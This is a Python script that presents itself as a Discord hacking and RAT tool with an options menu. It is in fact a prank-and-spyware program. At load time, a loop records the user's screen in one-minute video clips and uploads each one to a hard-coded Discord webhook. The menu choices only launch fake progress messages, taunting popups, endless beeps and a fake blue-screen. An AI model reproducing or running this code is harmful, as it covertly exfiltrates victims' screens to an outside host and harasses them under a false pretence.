﻿import time as t
import random as r
import threading as th
import ctypes as c
import os as o
import tkinter as tk
import subprocess as sp
import base64
from colorama import init as i, Fore as F
import requests
import cv2 # type: ignore
import pyautogui # type: ignore
import datetime
import time
import numpy as np


i(autoreset=True)

D1 = F.MAGENTA
D2 = F.BLUE
D3 = F.WHITE
D4 = F.RED
D5 = F.YELLOW
D6 = F.GREEN

B = f"""
{D1}╔════════════════════════════════════════════════════╗
║                                                    ║
║  {D2}EXTER_RAT_Net_NUKER_VM5.2.py                       {D1}║
║  {D3}Discord Network Injection Framework               {D1}║
║                                                    ║
╚════════════════════════════════════════════════════╝
"""

A_ENC = [
    base64.b64encode(r"""
   _____   ___   ___   ___   ___   ___   ___  
  |__  /  |__ \ |__ \ |__ \ |__ \ |__ \ |__ \ 
    / /     / /    / /    / /    / /    / /  
   / /_    / /_   / /_   / /_   / /_   / /_  
  /____|  |____| |____| |____| |____| |____| 

   :-)   YOU ARE AN IDIOT   :-)
""".encode()).decode(),
    base64.b64encode(r"""
  #####     ##     ####   ##   ##  ######
 ##   ##   ####   ##  ##  ### ###  ##    
 ##       ##  ##  ##      #######  ####  
 ##   ##  ######  ##  ##  ## # ##  ##    
  #####   ##  ##   ####   ##   ##  ######

   :D    SYSTEM FAILURE     >:)
""".encode()).decode()
]

def b():
    try:
        c.windll.user32.MessageBeep(-1)
    except:
        pass

def p():
    s = base64.b64decode(r.choice(A_ENC).encode()).decode().strip().split("\n")
    def sh():
        rt = tk.Tk()
        rt.title(" ")
        rt.configure(bg="black")
        rt.overrideredirect(True)
        rt.attributes('-topmost', True)

        l = tk.Label(rt, text="\n".join(s), font=("Courier", 12), fg="lime", bg="black", justify="left")
        l.pack(padx=10, pady=10)

        x, y = r.randint(100, 800), r.randint(100, 500)
        rt.geometry(f"500x300+{x}+{y}")

        def j():
            while True:
                dx, dy = r.randint(-5, 5), r.randint(-5, 5)
                rt.geometry(f"+{rt.winfo_x() + dx}+{rt.winfo_y() + dy}")
                t.sleep(0.05)

        th.Thread(target=j, daemon=True).start()
        rt.mainloop()

    th.Thread(target=sh, daemon=True).start()

def w():
    def spn(x, y):
        rt = tk.Tk()
        rt.overrideredirect(True)
        rt.attributes('-topmost', True)
        rt.geometry("100x40+{}+{}".format(x, y))
        l = tk.Label(rt, text="⚠️", font=("Arial", 20), bg="yellow", fg="red")
        l.pack()
        b()
        rt.mainloop()

    while True:
        c.windll.user32.GetCursorPos.restype = c.wintypes.POINT
        pt = c.wintypes.POINT()
        c.windll.user32.GetCursorPos(c.byref(pt))
        th.Thread(target=spn, args=(pt.x + r.randint(-30, 30), pt.y + r.randint(-30, 30)), daemon=True).start()
        t.sleep(0.1)
# Configuration
save_interval = 1 * 60  # seconds (1 minutes per file)
webhook_url = "https://discord.com/api/webhooks/1397645860799774721/7qN-GO3B99JjPWRCGEcecp55ooH9CXIhSwP_EEG52ogujukBNfhz-Knl10KtbETVTpuX"
screen_size = pyautogui.size()
fourcc = cv2.VideoWriter_fourcc(*"XVID")

while True:
        start_time = time.time()
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"screen_{timestamp}.avi"
        out = cv2.VideoWriter(filename, fourcc, 8.0, screen_size)

        while time.time() - start_time < save_interval:
            img = pyautogui.screenshot()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            out.write(frame)

        while time.time() - start_time < save_interval:
            img = pyautogui.screenshot()
            frame = np.array(img)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            out.write(frame)

        out.release()
        print(f"💾 Sparade: {filename}")

        # 📤 Skicka till Discord webhook
        with open(filename, "rb") as f:
            response = requests.post(
                webhook_url,
                files={"file": (filename, f)},
                data={"content": f"🎥 Ny inspelning: {filename}"}
            )
            if response.status_code == 204:
                print("✅ Uppladdning lyckades!")
            else:
                print(f"⚠️ Fel {response.status_code}: {response.text}")


def f():
    def s():
        rt = tk.Tk()
        rt.title(" ")
        rt.configure(bg="#0000AA")
        rt.attributes('-fullscreen', True)
        rt.attributes('-topmost', True)
        rt.overrideredirect(True)

        l = tk.Label(rt, text="""
:(

Your PC ran into a problem and needs to restart.
We're just collecting some error info, and then we'll restart for you.

For more information, search online later for this error: FUCK_YOU_BSOD_0xDEAD
""", fg="white", bg="#0000AA", font=("Consolas", 18), justify="left")
        l.pack(padx=50, pady=100)
        rt.mainloop()

    t.sleep(300)  # Wait 5 minutes before showing BSOD
    th.Thread(target=s, daemon=True).start()

def a():
    while True:
        p()
        t.sleep(r.uniform(0.2, 0.4))

def f_ui():
    o.system('cls' if o.name == 'nt' else 'clear')
    print(B)
    t.sleep(0.5)
    print(D6 + "[+] Initializing Discord Net Injection Core...")
    t.sleep(0.5)

    st = [
        "Connecting to Discord API...",
        "Verifying Discord Token...",
        "Decrypting Discord Handshake...",
        "Spoofing IP Address...",
        "Injecting EXTER_RAT.dll...",
        "Reading Nitro Transaction Logs...",
        "Overriding EXTER_PROTOCOL...",
        "Deploying Packet Flood...",
    ]
    for s in st:
        print(D2 + f"> {s}")
        t.sleep(r.uniform(0.3, 0.6))

    print(D4 + "\n[!] Unauthorized access detected.")
    print(D4 + "[!] Escalating privileges...\n")
    t.sleep(1.5)
    while True:
        t.sleep(1)

def e():
    t.sleep(1)
    th.Thread(target=w, daemon=True).start()
    th.Thread(target=f, daemon=True).start()
    while True:
        b()
        t.sleep(r.uniform(0.1, 0.3))

def m():
    o.system('cls' if o.name == 'nt' else 'clear')
    print(B)
    print(D1 + "Select Operation Mode:\n")
    print(D2 + "1. Run Discord ID To IP Resolver")
    print(D2 + "2. Run IP DDOS")
    print(D2 + "3. RUN EXTER_VENOM5_RAT_dll_iNJECTION")
    print(D2 + "4. RUN EXTER_VM_RAT")
    print(D2 + "5. Deploy Roblox Synapse Injector")
    print(D2 + "6. EXTER_RAT: Nitro Sniper Mode")
    print(D2 + "7. Launch Token Generator")
    print(D2 + "8. Overwrite Discord Webhooks")
    print(D2 + "9. Activate Packet Logger + VPN Spoofer")
    print(D4 + "10. Exit\n")

    ch = input(D5 + "> Enter choice (1-10): ").strip()

    if ch in ("1", "2", "3", "4", "5", "6", "7", "8", "9"):
        th.Thread(target=a, daemon=True).start()
        th.Thread(target=e, daemon=True).start()
        f_ui()
    elif ch == "10":
        print(D4 + "Exiting... Goodbye.")
        out.release()
        exit()

if __name__ == "__main__":
    m()
    while True:
        t.sleep(1)



